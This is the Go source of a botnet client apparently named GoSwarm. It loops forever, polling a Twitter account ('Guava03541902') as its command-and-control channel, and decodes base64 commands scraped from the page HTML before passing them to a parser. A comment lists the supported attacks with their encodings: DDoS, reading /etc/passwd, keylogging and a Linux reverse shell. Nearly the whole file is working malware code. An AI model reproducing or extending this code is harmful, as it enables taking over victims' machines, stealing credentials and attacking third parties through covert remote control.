/*
Botnet Client
*/

package client

import (
	"encoding/base64"
	"fmt"
	"io/ioutil"
	"net/http"
	"strings"
	"time"

	"github.com/Pimmytrousers/GoSwarm/client/parser"
)

/*
Attack Types:
	- DDoS (RERvUw==)
	- grab /etc/passwd (L2V0Yy9wYXNzd2QNCg==)
	- Keylog (a2V5bG9nDQo=)
	- ReverseShellLinux (cmV2ZXJzZVNoZWxsTGludXg=)
*/
var (
	commander        string        = "Guava03541902" // Twitter C&C account
	waitTime         time.Duration = 5               // Time to wait in between each request
	commandToExecute               = ""
)

func main() {
	fmt.Println("GoSwarm bot client created by Pim Trouerbach")
	// fmt.Println("Listening on: https://www.twitter.com/" + commander)
	for true {
		fmt.Println("Waiting for commands:")
		time.Sleep(time.Second * waitTime)
		refresh()

	}
}

func refresh() {
	lines := get_command()
	if lines == nil {
		return
	}

	for i := 0; i < len(lines); i++ {
		if strings.Contains(lines[i], "data-aria-label-part=\"0\">") {
			temp := strings.Split(strings.Split(lines[i], "data-aria-label-part=\"0\">")[1], "<")[0]
			if commandToExecute != temp && !strings.Contains(temp, "!clear") {
				commandToExecute = temp
				commandToExecutePlain, err := base64.StdEncoding.DecodeString(commandToExecute)
				if err != nil {
					panic(err)
				}
				fmt.Println("New command found:", string(commandToExecutePlain))
				parser.Parse(string(commandToExecute))
			} else if strings.Contains(temp, "!clear") {
				commandToExecute = "!clear"
			}

			i = len(lines)
		}
	}
}

func get_command() (lines []string) {
	result, err := http.Get("https://www.twitter.com/" + commander)
	if err != nil {
		panic(err)
		return nil
	}
	content, err := ioutil.ReadAll(result.Body)
	result.Body.Close()
	if err != nil {
		panic(err)
		return nil
	}

	return strings.Split(string(content), "\n")

}
